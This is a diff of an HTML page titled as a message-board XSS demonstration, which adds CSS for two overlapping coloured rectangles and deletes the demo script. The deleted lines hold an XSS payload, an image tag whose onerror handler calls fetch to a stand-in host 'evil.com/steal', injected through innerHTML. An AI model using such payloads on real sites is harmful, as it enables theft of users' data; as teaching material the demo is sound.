@@ -4,14 +4,36 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>留言板系统 - XSS演示</title>
+    <style>
+      body {
+        margin: 0;
+        padding: 50px;
+        background-color: #f0f0f0;
+        font-family: Arial, sans-serif;
+      }
 
+      .bottom-rect {
+        width: 250px;
+        height: 150px;
+        background-color: #ff6b6b;
+        transform: translateY(-50px);
+        position: relative;
+        z-index: 1;
+      }
+
+      .top-rounded-rect {
+        width: 200px;
+        height: 100px;
+        background-color: #4ecdc4;
+        border-radius: 20px;
+        position: relative;
+        z-index: 2;
+      }
+    </style>
   </head>
   <body>
-    <div></div>
+    <div class="top-rounded-rect"></div>
+    <div class="bottom-rect"></div>
   </body>
-  <script>
-    const div = document.querySelector("div");
-    // div.innerHTML = "很好的文章！<img src='x' onerror='fetch('https://evil.com/steal)'>";
-    div.innerHTML = "很好的文章！<img src='x' onerror=\"fetch('https://evil.com/steal')\">";
-  </script>
+  <script></script>
 </html>
